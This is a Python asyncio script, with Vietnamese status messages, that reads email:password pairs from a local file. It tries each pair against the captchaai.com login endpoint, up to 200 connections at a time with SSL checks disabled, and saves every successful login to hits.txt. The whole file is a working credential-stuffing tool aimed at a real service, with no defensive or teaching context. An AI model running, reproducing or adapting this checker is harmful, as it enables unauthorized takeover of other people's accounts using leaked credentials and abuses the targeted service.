import aiohttp
import aiofiles
import asyncio
from aiohttp import ClientSession, TCPConnector
import os

async def check_account(session, email, password):
    url = 'https://captchaai.com/ajax/user.php'
    data = {
        'action': 'login',
        'return': '0',
        'email': email,
        'password': password,
        'remember': 'on'
    }
    
    async with session.post(url, data=data, ssl=False) as response:
        result = await response.text()
        if 'Login success!' in result:
            async with aiofiles.open('hits.txt', 'a', encoding='utf-8') as f:
                await f.write(f'{email}:{password}\n')
            print(f'Đăng nhập thành công: {email}')
        elif 'Invalid password!' in result or 'Invalid email' in result:
            print(f'Đăng nhập thất bại: {email}')
        else:
            print(f'Kết quả không xác định: {email}')

async def process_accounts(accounts):
    connector = TCPConnector(limit=200)
    async with ClientSession(connector=connector) as session:
        tasks = [check_account(session, email, password) for email, password in accounts]
        await asyncio.gather(*tasks)

async def main():
    accounts = []
    file_path = 'user.txt'
    file_size = os.path.getsize(file_path)
    bytes_read = 0

    async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
        async for line in f:
            bytes_read += len(line.encode('utf-8'))
            progress = (bytes_read / file_size) * 100
            print(f'\rĐã tải: {bytes_read / 1024:.2f} KB / {file_size / 1024:.2f} KB ({progress:.2f}%)', end='', flush=True)
            
            try:
                email, password = line.strip().split(':')
                accounts.append((email, password))
            except ValueError:
                print(f'\nDòng không hợp lệ: {line.strip()}')

    print('\nĐã tải xong file.')

    chunk_size = 1000
    for i in range(0, len(accounts), chunk_size):
        chunk = accounts[i:i+chunk_size]
        await process_accounts(chunk)

if __name__ == '__main__':
    asyncio.run(main())